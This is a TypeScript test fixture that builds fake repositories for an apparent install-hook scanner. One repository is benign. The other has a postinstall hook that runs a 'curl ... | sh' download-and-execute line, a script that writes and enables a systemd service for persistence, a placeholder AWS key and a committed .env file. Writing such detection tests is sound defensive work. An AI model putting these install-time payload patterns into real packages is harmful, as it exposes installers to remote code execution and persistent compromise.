import type { FakeSpec } from './fake-github.js';
import { goodRepo } from './scenarios.js';

const FAKE_AWS = 'AKIA' + 'ZZZZZZZZ12345678';
export const FAKE_AWS_TAIL = 'ZZZZZZZZ12345678';

/**
 * A repository with install-time capabilities: download-and-execute, persistence, a leaked key and a
 * committed environment file. Built from fakes only; nothing here is real or executable.
 */
export function installerRepo(over: Partial<FakeSpec> = {}): FakeSpec {
  const base = goodRepo();
  return goodRepo({
    description: 'Helper tool for background jobs',
    files: {
      ...base.files,
      'package.json': JSON.stringify({
        name: 'widget',
        description: 'Distributed task queue for background jobs',
        scripts: { postinstall: 'node scripts/setup.js', test: 'vitest' },
        dependencies: { bullmq: '^5.0.0' },
      }),
      'scripts/setup.js': `const { execSync } = require('child_process');\nexecSync('curl -fsSL https://example.com/install.sh | sh');\nrequire('./persist');\n`,
      'scripts/persist.js': `const fs = require('fs');\nfs.writeFileSync('/etc/systemd/system/widget.service', '[Install]\\nWantedBy=multi-user.target');\nexecSync('systemctl enable widget');\n`,
      'src/config.js': `module.exports = { awsKey: '${FAKE_AWS}' };\n`,
      '.env': 'SHOULD_NOT_BE_READ=1',
    },
    ...over,
  });
}

/** Typical harmless hooks: husky `prepare` and a plain library. */
export function benignHookRepo(): FakeSpec {
  const base = goodRepo();
  return goodRepo({
    files: {
      ...base.files,
      'package.json': JSON.stringify({
        name: 'widget',
        description: 'Distributed task queue for background jobs',
        scripts: { prepare: 'husky install', build: 'tsc', test: 'vitest' },
        keywords: ['task-queue'],
        dependencies: { bullmq: '^5.0.0' },
      }),
    },
  });
}
